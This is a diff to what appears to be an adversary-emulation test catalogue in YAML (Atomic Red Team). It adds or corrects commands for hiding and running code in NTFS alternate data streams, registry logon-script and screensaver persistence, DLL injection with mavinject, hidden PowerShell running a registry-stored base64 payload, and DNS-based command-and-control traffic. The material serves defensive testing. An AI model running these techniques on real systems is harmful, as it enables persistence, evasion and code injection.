@@ -1626,9 +1626,12 @@ persistence:
         name: command_prompt
         elevation_required: false
         command: |
-          echo "test" > #{file_name}:#{ads_filename}
-          echo "test" > :#{ads_filename}
-          dir /s /r | find ":$DATA"
+          echo "Normal Text." > #{file_name}
+          echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
+          for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Create ADS PowerShell
       description: 'Create an Alternate Data Stream with PowerShell. Write access
         is required.
@@ -2672,10 +2675,10 @@ persistence:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
+        command: |
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "#{script_command}"
+          REM cleanup command below.
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
     - name: Logon Scripts - Mac
       description: 'Mac logon script
 
@@ -3729,7 +3732,7 @@ persistence:
         command: |
           copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
-          reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 60 /f
+          reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
           reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
           shutdown /r /t 0
@@ -7226,9 +7229,12 @@ defense-evasion:
         name: command_prompt
         elevation_required: false
         command: |
-          echo "test" > #{file_name}:#{ads_filename}
-          echo "test" > :#{ads_filename}
-          dir /s /r | find ":$DATA"
+          echo "Normal Text." > #{file_name}
+          echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
+          for /f "usebackq delims=φ" %i in (#{file_name}:#{ads_filename}) do %i
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Create ADS PowerShell
       description: 'Create an Alternate Data Stream with PowerShell. Write access
         is required.
@@ -9010,7 +9016,7 @@ defense-evasion:
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject $pid /INJECTRUNNING #{dll_payload}
+        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
 
 '
     - name: Process Injection via PowerSploit
@@ -12069,7 +12075,7 @@ privilege-escalation:
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject $pid /INJECTRUNNING #{dll_payload}
+        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
 
 '
     - name: Process Injection via PowerSploit
@@ -17825,6 +17831,32 @@ execution:
         command: |
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJyVTeXN0ZW1Sb290JS9UZW1wL2FydC1tYXJrZXIudHh0JyAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
           powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
+    - name: NTFS Alternate Data Stream Access
+      description: 'Creates a file with an alternate data stream and simulates executing
+        that hidden code/file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        ads_file:
+          description: File created to store Alternate Stream Data
+          type: String
+          default: "$env:TEMP\\NTFS_ADS.txt"
+      executor:
+        name: powershell
+        elevation_required: false
+        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+          -contains "NTFS"){0}else{1}
+
+'
+        command: |
+          Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+          $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
+          Invoke-Expression $streamcommand
+        cleanup_command: 'Remove:Item #{ads_file}
+
+'
   T1121:
     technique:
       external_references:
@@ -19648,10 +19680,10 @@ lateral-movement:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ
-          /d "#{script_command}"
-
-'
+        command: |
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "#{script_command}"
+          REM cleanup command below.
+          REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
     - name: Logon Scripts - Mac
       description: 'Mac logon script
 
@@ -22290,7 +22322,7 @@ command-and-control:
       executor:
         name: powershell
         elevation_required: false
-        command: 'for($i=0; $i -le $#{query_volume}; $i++) { Resolve-DnsName -type
+        command: 'for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type
           "#{query_type}" "#{subdomain}.$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"
           -QuickTimeout}
 
